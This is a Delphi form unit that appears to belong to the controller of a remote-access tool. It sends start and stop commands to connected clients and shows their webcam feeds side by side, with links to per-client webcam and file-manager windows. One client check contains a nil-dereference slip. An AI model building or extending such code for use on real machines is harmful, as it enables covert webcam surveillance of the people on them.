unit UnitMultiWebcam;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, ImgList, UnitMain, jpeg, SocketUnitEx,
  UnitFunctions, UnitCommands, UnitVariables, UnitManager, Menus, UnitWebcam,
  uJSONConfig, UnitConstants;

type
  TFormMultiWebcam = class(TForm)
    lvWebcam: TListView;
    ilThumbs2: TImageList;
    pnl1: TPanel;
    lbl1: TLabel;
    btn1: TButton;
    trckbr1: TTrackBar;
    pm1: TPopupMenu;
    M1: TMenuItem;
    cbb1: TComboBoxEx;
    lbl2: TLabel;
    procedure trckbr1Change(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure btn1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure lvWebcamDblClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure M1Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
  public
    { Public declarations }      
    ThumbSize: Integer;
    procedure AddThumb(Bmp: TBitmap; ClientId: string);
  end;

var
  FormMultiWebcam: TFormMultiWebcam;

implementation

{$R *.dfm}
     
procedure TFormMultiWebcam.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormMultiWebcam.AddThumb(Bmp: TBitmap; ClientId: string);
var
  i: Integer;
begin
  for i := 0 to lvWebcam.Items.Count -1 do
  begin
    if lvWebcam.Items[i].Caption = ClientId then
    begin
      try
        if lvWebcam.Items[i].ImageIndex = -1 then
          lvWebcam.Items[i].ImageIndex := ilThumbs2.Add(Bmp, nil)
        else ilThumbs2.Replace(lvWebcam.Items[i].ImageIndex, Bmp, nil);
      except
      end;
    end;

    Application.ProcessMessages;
  end;
end;

procedure TFormMultiWebcam.trckbr1Change(Sender: TObject);
begin
  case trckbr1.Position of
    0: ThumbSize := 100;
    1: ThumbSize := 128;
    2: ThumbSize := 132;
    3: ThumbSize := 164;
    4: ThumbSize := 200;
  end;

  ilThumbs2.Width := ThumbSize;
  ilThumbs2.Height := ThumbSize;
end;

procedure TFormMultiWebcam.FormClose(Sender: TObject;
  var Action: TCloseAction);
var                
  JSONConfig: TJSONConfig;
  TmpStr: string;
  i: Integer;
begin
  if btn1.Caption = 'Stop' then btn1.Click;
  if lvWebcam.Items.Count = 0 then Exit;
  for i := lvWebcam.Items.Count - 1 downto 0 do lvWebcam.Items.Item[i].Delete;   

  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Multi-W width', Width);
  JSONConfig.WriteInteger('Multi-W height', Height);
  JSONConfig.WriteInteger('Multi-W left', Left);
  JSONConfig.WriteInteger('Multi-W top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormMultiWebcam.btn1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if btn1.Caption = 'Start' then
  begin
    if lvWebcam.Items.Count = 0 then Exit;
    btn1.Caption := 'Stop';
    trckbr1.Enabled := False;
    cbb1.Enabled := False;

    ilThumbs2.Clear;
    ilThumbs2.Width := ThumbSize;
    ilThumbs2.Height := ThumbSize;

    for i := 0 to lvWebcam.Items.Count - 1 do
    begin
      if lvWebcam.Items.Item[i].Data = nil then
      begin
        lvWebcam.Items.Item[i].Delete;
        Continue;
      end;

      ClientDatas := TClientDatas(lvWebcam.Items.Item[i].Data);
      if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
      lvWebcam.Items.Item[i].ImageIndex := -1;
      ClientDatas.SendDatas(MULTIWEBCAMSTART + '|' + IntToStr(ThumbSize) + '|' +
        IntToStr(cbb1.ItemIndex));
    end;
  end
  else
  begin
    btn1.Caption := 'Start';
    trckbr1.Enabled := True;
    cbb1.Enabled := True;
    if lvWebcam.Items.Count = 0 then Exit;

    for i := 0 to lvWebcam.Items.Count - 1 do
    begin
      if lvWebcam.Items.Item[i].Data = nil then
      begin
        lvWebcam.Items.Item[i].Delete;
        Continue;
      end;

      ClientDatas := TClientDatas(lvWebcam.Items.Item[i].Data);
      if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
      ClientDatas.SendDatas(MULTIWEBCAMSTOP + '|');
    end;
  end;
end;

procedure TFormMultiWebcam.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Multi-W width');
  if i <= 0 then Width := 696 else Width := i;
  i := JSONConfig.ReadInteger('Multi-W height');
  if i <= 0 then Height := 360 else Height := i;
  i := JSONConfig.ReadInteger('Multi-W left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Multi-W top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;

  ThumbSize := 100;
  ilThumbs2.Width := ThumbSize;
  ilThumbs2.Height := ThumbSize;     
  cbb1.ItemIndex := 0;
end;

procedure TFormMultiWebcam.lvWebcamDblClick(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormWebcam;
begin
  if not Assigned(lvWebcam.Selected) then Exit;
  ClientDatas := TClientDatas(lvWebcam.Selected.Data);
  if ClientDatas = nil then Exit;
  if ClientDatas.Forms[6] <> nil then TFormWebcam(ClientDatas.Forms[6]).Show else
  begin
    TmpForm := TFormWebcam.Create(Self, ClientDatas);
    ClientDatas.Forms[6] := TmpForm;
    TmpForm.Caption := 'Webcam - [' + ClientDatas.UserId + ']';
    TmpForm.Show;
  end;
end;

procedure TFormMultiWebcam.FormShow(Sender: TObject);
begin
  btn1Click(Sender);
end;

procedure TFormMultiWebcam.M1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormManager;
  i: Integer;
begin
  for i := 0 to lvWebcam.Items.Count - 1 do
  begin
    if not lvWebcam.Items.Item[i].Selected then Continue;
    ClientDatas := TClientDatas(lvWebcam.Items.Item[i].Data);
    if (ClientDatas = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
    if ClientDatas.Forms[16] <> nil then TFormManager(ClientDatas.Forms[16]).Show else
    begin
      TmpForm := TFormManager.Create(Self, ClientDatas);
      ClientDatas.Forms[16] := TmpForm;
      TmpForm.Caption := 'Manager - [' + ClientDatas.UserId + ']';
      TmpForm.Show;
    end;
  end;
end;

end.
